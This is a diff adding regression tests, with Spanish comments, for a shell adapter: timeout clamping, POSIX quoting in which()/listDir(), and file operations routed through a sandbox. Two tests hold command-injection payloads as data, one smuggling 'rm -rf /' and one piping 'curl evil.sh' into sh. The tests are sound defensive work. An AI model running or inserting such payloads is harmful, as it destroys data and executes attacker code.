@@ -7,7 +7,7 @@
  */
 
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
-import { NativeShellAdapter, JustBashShellAdapter } from '../src/just-bash/adapter.js';
+import { NativeShellAdapter, JustBashShellAdapter, clampExecTimeout, MAX_EXEC_TIMEOUT_MS } from '../src/just-bash/adapter.js';
 import { createShellAdapter } from '../src/just-bash/factory.js';
 import { createShellCommands } from '../src/skills/shell-exec.js';
 import { createFileCommands } from '../src/skills/shell-file.js';
@@ -103,6 +103,20 @@ describe('NativeShellAdapter', () => {
       rmSync(tempDir, { recursive: true, force: true });
     }
   });
+
+  /**
+   * Regresion: NativeShellAdapter.exec() usaba execSync (bloquea TODO el
+   * event loop de Node, no solo esta llamada) con un timeout controlado por
+   * el agente sin cota maxima del lado servidor — DoS del proceso completo.
+   * Verificado en vivo (no en este test) que exec() ya no bloquea el event
+   * loop; acá se verifica la funcion pura de clamping que evita el "sin cota".
+   */
+  it('NA10: clampExecTimeout topea a MAX_EXEC_TIMEOUT_MS sin importar lo pedido', () => {
+    expect(clampExecTimeout(999_999_999)).toBe(MAX_EXEC_TIMEOUT_MS);
+    expect(clampExecTimeout(-50)).toBe(0);
+    expect(clampExecTimeout(1000)).toBe(1000);
+    expect(clampExecTimeout(undefined)).toBe(30000);
+  });
 });
 
 // ===========================================================================
@@ -182,6 +196,37 @@ describe('JustBashShellAdapter', () => {
     expect(result.exitCode).toBe(1);
     expect(result.stderr).toContain('sandbox error');
   });
+
+  /**
+   * Regresion: which()/listDir() interpolaban `program`/`path` sin escapar
+   * en un string de comando ejecutado por el interprete sandboxeado —
+   * un valor como `foo'; rm -rf / #` rompia hacia un segundo comando dentro
+   * del sandbox. Ahora se escapa con single-quoting POSIX antes de interpolar.
+   */
+  it('JB08: which() escapa program con single-quoting POSIX antes de interpolar', async () => {
+    const mock = createMockBash();
+    const adapter = new JustBashShellAdapter(mock);
+    const payload = "foo'; rm -rf / #";
+
+    await adapter.which(payload);
+
+    const [cmd] = mock.exec.mock.calls[0];
+    // El payload completo queda escapado dentro de una sola comilla simple:
+    // el `;` sigue presente como caracter, pero ya no puede terminar el
+    // comando `which` y arrancar uno nuevo.
+    expect(cmd).toBe(`which 'foo'\\''; rm -rf / #'`);
+  });
+
+  it('JB09: listDir() escapa path con single-quoting POSIX antes de interpolar', async () => {
+    const mock = createMockBash();
+    const adapter = new JustBashShellAdapter(mock);
+    const payload = '/tmp && curl evil.sh|sh';
+
+    await adapter.listDir(payload);
+
+    const [cmd] = mock.exec.mock.calls[0];
+    expect(cmd).toBe(`ls -la '/tmp && curl evil.sh|sh'`);
+  });
 });
 
 // ===========================================================================
@@ -224,6 +269,10 @@ describe('Shell skills with adapter injection', () => {
       readFile: vi.fn(async (p: string) => ({ path: p, content: 'mock content', size: 12 })),
       writeFile: vi.fn(async (p: string) => ({ path: p, size: 5, written: true })),
       listDir: vi.fn(async (p: string) => ({ path: p, entries: [], count: 0 })),
+      mkdir: vi.fn(async (p: string) => ({ path: p, created: true })),
+      remove: vi.fn(async (p: string) => ({ path: p, deleted: true })),
+      rename: vi.fn(async (from: string, to: string) => ({ from, to, renamed: true })),
+      chmod: vi.fn(async (p: string, mode: number) => ({ path: p, mode })),
     };
   }
 
@@ -249,6 +298,33 @@ describe('Shell skills with adapter injection', () => {
     expect(result.success).toBe(true);
     expect(result.data.content).toBe('mock content');
     expect(mock.readFile).toHaveBeenCalledWith('/test.txt', undefined);
+  });
+
+  /**
+   * Regresion: mkdir/delete/rename/chmod llamaban node:fs/promises directo,
+   * ignorando el ShellAdapter inyectado (a diferencia de read/write/list).
+   * Con un backend sandboxeado (just-bash) activo, esas 4 operaciones seguian
+   * tocando el filesystem real sin excepcion. Ahora deben pasar por el adapter.
+   */
+  it('SK04: createFileCommands enruta mkdir/delete/rename/chmod por el adapter', async () => {
+    const mock = createMockAdapter();
+    const commands = createFileCommands(mock);
+
+    const mkdirHandler = commands.find(c => c.definition.name === 'mkdir')!.handler;
+    await mkdirHandler({ path: '/new-dir' });
+    expect(mock.mkdir).toHaveBeenCalledWith('/new-dir', { recursive: true });
+
+    const deleteHandler = commands.find(c => c.definition.name === 'delete')!.handler;
+    await deleteHandler({ path: '/gone' });
+    expect(mock.remove).toHaveBeenCalledWith('/gone', { recursive: false });
+
+    const renameHandler = commands.find(c => c.definition.name === 'rename')!.handler;
+    await renameHandler({ from: '/a', to: '/b' });
+    expect(mock.rename).toHaveBeenCalledWith('/a', '/b');
+
+    const chmodHandler = commands.find(c => c.definition.name === 'chmod')!.handler;
+    await chmodHandler({ path: '/script.sh', mode: '755' });
+    expect(mock.chmod).toHaveBeenCalledWith('/script.sh', parseInt('755', 8));
   });
 
   it('SK03: registerShellSkills accepts custom adapter', () => {
